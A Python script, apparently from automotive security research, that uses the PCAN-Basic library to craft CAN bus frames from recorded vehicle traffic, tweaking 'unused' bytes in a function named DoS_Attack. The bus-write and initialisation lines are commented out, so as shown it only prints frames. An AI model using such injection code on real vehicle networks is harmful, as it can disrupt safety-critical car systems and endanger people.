from PCANBasic import *
import random
import time
import datetime
from os import walk

unused_bits = {'0165': [3, '00'], '02B0': [3, '07'], '0164': [0, '00'], '0370': [0, 'FF'], '043F': [2, '60'], '0440': [0, 'FF'],
 '0018': [0, '00'], '0316': [7, '7F'], '018F': [0, 'FE'], '0080': [1, '17'], '0081': [3, '00'], '0260': [3, '30'], '02A0': [1, '00'],
 '0153': [0, '00'], '0329': [7, '10'], '0382': [0, '40'], '0545': [0, 'C8'], '04F0': [0, '00'], '04B1': [4, '00'], '0350': [1, '2B'],
 '01F1': [0, '00'], '02C0': [0, '3D'], '04F2': [0, 'A0'], '0120': [0, '00'], '0517': [1, '00'], '0587': [0, '00'], '00A0': [6, '00'],
 '00A1': [2, '80'], '0510': [0, '00'], '05E4': [0, '00'], '059B': [0, '00'], '0110': [0, 'E0'], '0050': [0, '00'], '04F1': [0, 'C0'],
 '0690': [0, '03'], '05F0': [0, '00'], '051A': [0, '00'], '0034': [0, '00'], '05A0': [0, '00'], '05A2': [0, '25'], '0042': [0, '0B'],
 '0043': [0, '00'], '0044': [0, '00']}


mypath = "Filtered Datas"
files = []

for (dirpath, dirnames, filenames) in walk(mypath):
    files.extend(filenames)

time_offset = 0.01


def DoS_Attack(id, data):
    all_datas = ""
    Fuzzing_ID = int(id, 16)

    DoS_DATA = TPCANMsg()
    DoS_DATA.ID = int(Fuzzing_ID)
    DoS_DATA.LEN = len(data)
    DoS_DATA.MSGTYPE = PCAN_MESSAGE_STANDARD
    
    all_datas += str(DoS_DATA.ID) + "\t" + str(DoS_DATA.LEN) + "\t"
    
    check_ind = unused_bits[id][0]
    check_val = unused_bits[id][1]
    for i in range(len(data)):
        if check_ind == i and check_val == data[i]:
            DoS_DATA.DATA[i] = int(data[i], 16) + 2
        else:
            DoS_DATA.DATA[i] = int(data[i], 16)
        all_datas += str(DoS_DATA.DATA[i]) + "\t"

    print(all_datas)
    # CAN.Write(CAN_BUS, Fuzzing_attack)
    # time.sleep(time_offset)

if __name__ == "__main__":
#    CAN = PCANBasic()                           #CAN 생성자 
#    CAN_BUS = PCAN_USBBUS2
#    result = CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
#    if result != PCAN_ERROR_OK:           
#        print("oh No")
#        CAN.GetErrorText(result)
#        print(result)
    
    file_id = files[0][:-4]
    print(file_id)
    file1 = open("Filtered Datas\\" + files[0])
    lines = file1.readlines()
    l = int(len(lines[0][:-1])/2)
    print(l)
    print(lines[0])
    ind = 0
    while ind <= 3:
        datas = []
        for i in range(l):
            datas.append(lines[0][i*2:i*2+2])
        DoS_Attack(file_id, datas)
        time.sleep(time_offset)
        if ind >= (len(lines) - 1):
            ind = 0
        else:
            ind += 1